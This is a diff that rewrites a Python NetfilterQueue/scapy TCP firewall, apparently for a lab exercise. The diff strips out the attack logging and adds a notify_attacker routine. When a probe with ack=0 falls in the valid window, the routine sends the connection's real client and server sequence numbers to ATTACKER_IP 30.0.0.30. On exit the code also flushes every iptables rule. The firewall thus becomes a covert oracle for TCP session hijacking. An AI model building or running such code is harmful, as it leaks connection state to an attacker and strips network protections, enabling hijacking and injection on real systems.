@@ -1,30 +1,30 @@
 from netfilterqueue import NetfilterQueue
-from scapy.all import IP, TCP
+from scapy.all import IP, TCP, send as scapy_send, Raw
 
 # ==========================
 # Global Variables
 # ==========================
 
 connections = {}
-
 attack_count = 0
+WINDOW_SIZE = 65535
 
-WINDOW_SIZE = 1000
+# Attacker notification
+ATTACKER_IP = "30.0.0.30"
+NOTIFY_PORT = 9999
+
+nfqueue = None
+found = False
 
 print("=" * 60)
 print(" Stateful TCP Firewall Started ")
 print("=" * 60)
 
 
-# ==========================
-# Helper Functions
-# ==========================
-
 def print_packet(ip, tcp, flags):
     print("\n" + "=" * 60)
     print("TCP PACKET")
     print("=" * 60)
-
     print(f"Source IP      : {ip.src}")
     print(f"Destination IP : {ip.dst}")
     print(f"Source Port    : {tcp.sport}")
@@ -35,54 +35,41 @@ def print_packet(ip, tcp, flags):
 
 
 def print_connection_table():
-
-    print("\n" + "=" * 60)
-    print("CONNECTION TABLE")
-    print("=" * 60)
-
-    if not connections:
-        print("No Active Connections")
-        return
-
+    print("\n==== CONNECTION TABLE ================")
     for conn, info in connections.items():
-
-        print(conn)
-        print(info)
-        print("-" * 60)
+        print(conn, info)
+    print("======================================\n")
 
 
-def log_attack(ip, tcp, flags):
-
-    global attack_count
-
-    attack_count += 1
-
-    print("\n" + "=" * 60)
-    print("[!] ATTACK DETECTED")
-    print("=" * 60)
-
-    print(f"Source      : {ip.src}")
-    print(f"Destination : {ip.dst}")
-    print(f"SPORT       : {tcp.sport}")
-    print(f"DPORT       : {tcp.dport}")
-    print(f"FLAGS       : {flags}")
-
-    print(f"Total Attacks Blocked : {attack_count}")
-
-    with open("firewall.log", "a") as f:
-        f.write(
-            f"{ip.src} -> {ip.dst} "
-            f"{tcp.sport}->{tcp.dport} "
-            f"SEQ={tcp.seq} "
-            f"FLAGS={flags} "
-            f"DROPPED\n"
+def notify_attacker(client_seq, server_seq):
+    """
+    Send TCP packet to attacker with real values:
+      packet.seq = real client_seq
+      packet.ack = real server_seq
+    """
+    notify = (
+        IP(dst=ATTACKER_IP)
+        / TCP(
+            sport=NOTIFY_PORT,
+            dport=NOTIFY_PORT,
+            seq=client_seq,
+            ack=server_seq,
+            flags="PA"
         )
+        / Raw(load=b"SEQ_ACK_FOUND")
+    )
 
-        # ==========================
+    # Send 3 times for reliability
+    for _ in range(3):
+        scapy_send(notify, verbose=False)
+
+
+# ==========================
 # Packet Processing
 # ==========================
 
 def process(packet):
+    global attack_count, nfqueue, found
 
     ip = IP(packet.get_payload())
 
@@ -91,32 +78,22 @@ def process(packet):
         return
 
     tcp = ip[TCP]
-
     flags = tcp.sprintf("%TCP.flags%")
-
-    print_packet(ip, tcp, flags)
 
     # -------------------------
     # SYN
     # -------------------------
     if flags == "S":
 
-        key = (
-            ip.src,
-            ip.dst,
-            tcp.sport,
-            tcp.dport
-        )
+        key = (ip.src, ip.dst, tcp.sport, tcp.dport)
 
         connections[key] = {
             "state": "SYN_SENT",
-            "client_seq": tcp.seq,
+            "client_seq": tcp.seq + 1,
             "server_seq": 0
         }
 
-        print("\n[+] NEW CONNECTION")
-        print(key)
-
+        print(f"\n[+] NEW CONNECTION {key}")
         packet.accept()
         return
 
@@ -125,20 +102,12 @@ def process(packet):
     # -------------------------
     elif flags == "SA":
 
-        key = (
-            ip.dst,
-            ip.src,
-            tcp.dport,
-            tcp.sport
-        )
+        key = (ip.dst, ip.src, tcp.dport, tcp.sport)
 
         if key in connections:
-
             connections[key]["state"] = "SYN_RECEIVED"
-
-            connections[key]["server_seq"] = tcp.seq
-
-            print("\n[+] SYN ACK RECEIVED")
+            connections[key]["server_seq"] = tcp.seq + 1
+            print("[+] SYN ACK")
 
         packet.accept()
         return
@@ -148,47 +117,28 @@ def process(packet):
     # -------------------------
     elif flags == "A":
 
-        key = (
-            ip.src,
-            ip.dst,
-            tcp.sport,
-            tcp.dport
-        )
+        key = (ip.src, ip.dst, tcp.sport, tcp.dport)
 
         if key in connections:
-
             connections[key]["state"] = "ESTABLISHED"
-
-            print("\n[+] CONNECTION ESTABLISHED")
-
+            print("[+] CONNECTION ESTABLISHED")
             print_connection_table()
 
         packet.accept()
         return
-        # -------------------------
+
+    # -------------------------
     # DATA (PSH / ACK)
     # -------------------------
     elif "P" in flags:
 
-        key = (
-            ip.src,
-            ip.dst,
-            tcp.sport,
-            tcp.dport
-        )
-
-        reverse_key = (
-            ip.dst,
-            ip.src,
-            tcp.dport,
-            tcp.sport
-        )
+        key = (ip.src, ip.dst, tcp.sport, tcp.dport)
+        reverse_key = (ip.dst, ip.src, tcp.dport, tcp.sport)
 
         conn_key = None
 
         if key in connections:
             conn_key = key
-
         elif reverse_key in connections:
             conn_key = reverse_key
 
@@ -197,66 +147,61 @@ def process(packet):
         # -------------------------
         if conn_key and connections[conn_key]["state"] == "ESTABLISHED":
 
-            # Client -> Server
             if key == conn_key:
                 expected_seq = connections[conn_key]["client_seq"]
-
-            # Server -> Client
             else:
                 expected_seq = connections[conn_key]["server_seq"]
 
             window_start = expected_seq
-            window_end = expected_seq + WINDOW_SIZE
-
-            print("\n" + "=" * 60)
-            print("TCP WINDOW CHECK")
-            print("=" * 60)
-
-            print(f"Expected SEQ : {expected_seq}")
-            print(f"Received SEQ : {tcp.seq}")
-            print(f"Window Start : {window_start}")
-            print(f"Window End   : {window_end}")
+            window_end = (expected_seq + WINDOW_SIZE) & 0xFFFFFFFF
 
             # -------------------------
             # Invalid Sequence
             # -------------------------
             if not (window_start <= tcp.seq <= window_end):
-
-                print("\n[!] INVALID TCP WINDOW")
-                print("[-] Packet Dropped")
-
-                with open("window.log", "a") as f:
-                    f.write(
-                        f"INVALID "
-                        f"{ip.src}->{ip.dst} "
-                        f"SEQ={tcp.seq}\n"
-                    )
-
                 packet.drop()
                 return
 
-            # -------------------------
-            # Valid Sequence
-            # -------------------------
-            print("\n[+] VALID TCP WINDOW")
-            print("[+] Packet Forwarded")
+            # =========================================
+            # VALID SEQUENCE FOUND
+            # =========================================
 
-            with open("window.log", "a") as f:
-                f.write(
-                    f"VALID "
-                    f"{ip.src}->{ip.dst} "
-                    f"SEQ={tcp.seq}\n"
-                )
+            # Check if this is attacker's probe (ack=0)
+            # Real client always has correct ACK (never 0)
+            if tcp.ack == 0 and not found:
 
+                real_client_seq = expected_seq
+                real_server_seq = connections[conn_key]["server_seq"]
+
+                print("\n" + "!" * 60)
+                print("  ATTACKER GUESSED CORRECT SEQ!")
+                print("!" * 60)
+                print(f"  Client SEQ : {real_client_seq}")
+                print(f"  Server SEQ : {real_server_seq}")
+                print("!" * 60)
+                print("\n[*] Sending values to attacker...")
+
+                notify_attacker(real_client_seq, real_server_seq)
+
+                print("[*] Notification sent to attacker")
+                print("[*] Firewall continues running — forwarding packets...\n")
+
+                found = True
+
+                # DON'T update client_seq here!
+                # Server will drop this packet (ack=0 is invalid)
+                # So server's RCV.NXT stays the same
+                # Firewall must stay in sync with server
+                packet.accept()
+                return
+
+            # Normal valid packet — update seq tracking
             payload_len = len(bytes(tcp.payload))
 
             if key == conn_key:
                 connections[conn_key]["client_seq"] = tcp.seq + payload_len
-
             else:
                 connections[conn_key]["server_seq"] = tcp.seq + payload_len
-
-            print_connection_table()
 
             packet.accept()
             return
@@ -264,18 +209,13 @@ def process(packet):
         # -------------------------
         # No Connection Found
         # -------------------------
-        log_attack(ip, tcp, flags)
-
-        print("Reason : NO Established Connection")
-
+        attack_count += 1
         packet.drop()
-
         return
-    # ==========================
-# Accept Other Packets
-# ==========================
 
-    # Accept all packets that are not explicitly dropped
+    # -------------------------
+    # Accept Other TCP
+    # -------------------------
     packet.accept()
 
 
@@ -285,27 +225,26 @@ def process(packet):
 
 if __name__ == "__main__":
 
-    # Clear previous logs
-    open("firewall.log", "w").close()
-    open("window.log", "w").close()
-
     nfqueue = NetfilterQueue()
     nfqueue.bind(0, process)
 
     print("\n" + "=" * 60)
     print("Stateful TCP Firewall Running...")
     print("Listening on NFQUEUE 0")
+    print("Waiting for attacker probe...")
     print("=" * 60)
 
     try:
         nfqueue.run()
-
     except KeyboardInterrupt:
-
-        print("\n")
-        print("=" * 60)
-        print("Stopping Firewall...")
-        print("=" * 60)
-
+        print("\nStopping firewall...")
     finally:
-        nfqueue.unbind()
+        try:
+            nfqueue.unbind()
+        except:
+            pass
+
+        # Flush NFQUEUE rules so packets flow normally after exit
+        import os
+        os.system("iptables -F")
+        print("[*] iptables flushed — packets flow normally now")
